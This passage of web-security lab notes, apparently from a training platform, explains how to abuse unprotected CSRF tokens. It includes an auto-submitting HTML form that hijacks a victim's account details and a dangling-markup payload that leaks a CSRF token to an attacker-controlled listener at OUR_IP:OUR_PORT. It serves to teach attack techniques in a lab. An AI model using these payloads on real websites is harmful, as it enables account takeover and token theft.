## GET-based
Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.

To retrieve CSRF tokens in an HTTP GET request, use a proxy tool such as Burp Suite to intercept the request. Notice that the CSRF token is included in the request as a query parameter.

With the CSRF token now in our hand, all we have to do is create and serve the below HTML page to deface or takeover someone else's account:
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

We will then serve this malicious web page on a server. To simulate a victim accessing the malicious URL, we will open a new tab and visit our malicious page. Notice that Julie's profile details will change to the ones specified in our malicious HTML page.
## POST-based
The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. In the following example, we will attack an application and find a way to leak the CSRF token to allow us to mount a CSRF attack.

Using Burp Suite, intercept the POST request `/app/delete/our-email@htb.net`, notice that if we changed `our-email@htb.net` to `<h1>h1<u>underline<%2fu><%2fh1>` the page renders it, this shows that the web page is vulnerable to XSS attacks, with this we can chain a CSRF attack.

Inspecting the source code, we can see that the injection happens before a single quote. We can now abuse this to leak the CSRF token:
```html
...[SNIP]...Email: <div style="color: gainsboro;"><h1>h1<u>underline</u></h1></div><input name="csrf" type="hidden" value="51a2973f01c61ec8f21e093c2d84a030d7f551d2" meta-dev='testdata' meta-dev-note="secureThisToken">
         ^ this one
```

We will now start a Netcat listener and use the following which allows us to leak the CSRF token.
```txt
/app/delete/<table%20background='%2f%2fOUR_IP:OUR_PORT%2f
```

To simulate a victim accessing the malicious URL, we will open a new tab and visit our malicious page. Looking at our Netcat listener, we notice that a connection being made to our machine that leaks the CSRF token.